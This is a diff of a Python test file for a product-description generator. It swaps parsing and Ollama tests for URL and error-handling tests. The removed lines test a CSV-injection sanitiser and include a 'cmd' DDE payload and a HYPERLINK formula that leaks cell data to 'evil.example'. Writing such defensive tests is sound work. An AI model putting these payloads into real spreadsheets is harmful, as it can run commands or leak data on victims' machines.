@@ -1,44 +1,17 @@
-import csv
-import io
-import json
-import tempfile
-from pathlib import Path
-from unittest.mock import MagicMock, patch
+from unittest.mock import MagicMock
 
 import pytest
 
-from main import _parse_response, load_csv, ollama_available, user_message
+from main import _process_one, _site_from_url, generate_description, load_csv, user_message
+from providers import AllProvidersExhausted
 
 
-class TestParseResponse:
-    def test_valid_json(self):
-        result = _parse_response('{"beskrivning": "En bra produkt.", "varför": "Du behöver den."}')
-        assert result["beskrivning"] == "En bra produkt."
-        assert result["varför"] == "Du behöver den."
-
-    def test_json_with_varfor_fallback(self):
-        result = _parse_response('{"beskrivning": "Bra.", "varfor": "Behövs."}')
-        assert result["varför"] == "Behövs."
-
-    def test_json_embedded_in_text(self):
-        raw = 'Här är svaret: {"beskrivning": "Produkt.", "varför": "Bra."} tack.'
-        result = _parse_response(raw)
-        assert result["beskrivning"] == "Produkt."
-
-    def test_invalid_json_falls_back_to_plain_text(self):
-        result = _parse_response("Det här är en beskrivning utan JSON.")
-        assert result["beskrivning"] == "Det här är en beskrivning utan JSON."
-        assert result["varför"] == ""
-
-    def test_empty_string(self):
-        result = _parse_response("")
-        assert result["beskrivning"] == ""
-        assert result["varför"] == ""
-
-    def test_strips_whitespace(self):
-        result = _parse_response('  {"beskrivning": "  Fin produkt.  ", "varför": " Ja. "}  ')
-        assert result["beskrivning"] == "Fin produkt."
-        assert result["varför"] == "Ja."
+class TestUserMessage:
+    def test_formats_correctly(self):
+        msg = user_message("butik.se", "Klocka", "299")
+        assert "Klocka" in msg
+        assert "butik.se" in msg
+        assert "299" in msg
 
 
 class TestLoadCsv:
@@ -63,55 +36,63 @@ class TestLoadCsv:
         assert "Site" in fieldnames
 
 
-class TestOllamaAvailable:
-    def test_returns_true_on_ok_response(self):
-        mock_resp = MagicMock()
-        mock_resp.ok = True
-        with patch("main.requests.get", return_value=mock_resp):
-            assert ollama_available("http://localhost:11434") is True
+class TestSiteFromUrl:
+    def test_extracts_domain(self):
+        assert _site_from_url("https://exempel.se/produkt/123") == "exempel.se"
 
-    def test_returns_false_on_error_response(self):
-        mock_resp = MagicMock()
-        mock_resp.ok = False
-        with patch("main.requests.get", return_value=mock_resp):
-            assert ollama_available("http://localhost:11434") is False
+    def test_empty_url_returns_empty_string(self):
+        assert _site_from_url("") == ""
 
-    def test_returns_false_on_connection_error(self):
-        with patch("main.requests.get", side_effect=Exception("connection refused")):
-            assert ollama_available("http://localhost:11434") is False
+    def test_malformed_url_returns_empty_string(self):
+        assert _site_from_url("not-a-url") == ""
 
 
-class TestUserMessage:
-    def test_formats_correctly(self):
-        msg = user_message("butik.se", "Klocka", "299")
-        assert "Klocka" in msg
-        assert "butik.se" in msg
-        assert "299" in msg
+class TestGenerateDescription:
+    def test_delegates_to_chain(self):
+        chain = MagicMock()
+        chain.generate.return_value = {"beskrivning": "Bra.", "varför": "Ja."}
+
+        result = generate_description(chain, "butik.se", "Klocka", "299")
+
+        assert result == {"beskrivning": "Bra.", "varför": "Ja."}
+        chain.generate.assert_called_once()
+        args, _ = chain.generate.call_args
+        assert "Klocka" in args[1]
 
 
-class TestSafeCsv:
-    def setup_method(self):
-        from app import _safe_csv
-        self.safe = _safe_csv
+class TestProcessOne:
+    def test_success(self):
+        chain = MagicMock()
+        chain.generate.return_value = {"beskrivning": "Bra.", "varför": "Ja."}
+        product = {"id": 1, "url": "https://exempel.se/p", "title": "Klocka", "current_price": 299}
 
-    def test_normal_value_unchanged(self):
-        assert self.safe("En fin klocka") == "En fin klocka"
+        pid, parts, err = _process_one(chain, product)
 
-    def test_empty_string_unchanged(self):
-        assert self.safe("") == ""
+        assert pid == 1
+        assert parts["beskrivning"] == "Bra."
+        assert err is None
 
-    def test_formula_equals_prefixed(self):
-        assert self.safe("=SUM(A1:A10)") == "'=SUM(A1:A10)"
+    def test_all_providers_exhausted(self):
+        chain = MagicMock()
+        exc = AllProvidersExhausted.__new__(AllProvidersExhausted)
+        from datetime import datetime, timezone
+        exc.resume_at = datetime.now(timezone.utc)
+        chain.generate.side_effect = exc
+        product = {"id": 2, "url": "", "title": "Klocka", "current_price": 100}
 
-    def test_formula_plus_prefixed(self):
-        assert self.safe("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"
+        pid, parts, err = _process_one(chain, product)
 
-    def test_formula_minus_prefixed(self):
-        assert self.safe("-2+3") == "'-2+3"
+        assert pid == 2
+        assert parts is None
+        assert isinstance(err, AllProvidersExhausted)
 
-    def test_formula_at_prefixed(self):
-        assert self.safe("@SUM(1+1)") == "'@SUM(1+1)"
+    def test_other_exception_returns_error_string(self):
+        chain = MagicMock()
+        chain.generate.side_effect = RuntimeError("boom")
+        product = {"id": 3, "url": "", "title": "Klocka", "current_price": 100}
 
-    def test_hyperlink_injection_blocked(self):
-        payload = '=HYPERLINK("http://evil.example/?d="&A1,"Click")'
-        assert self.safe(payload).startswith("'")
+        pid, parts, err = _process_one(chain, product)
+
+        assert pid == 3
+        assert parts is None
+        assert "boom" in err
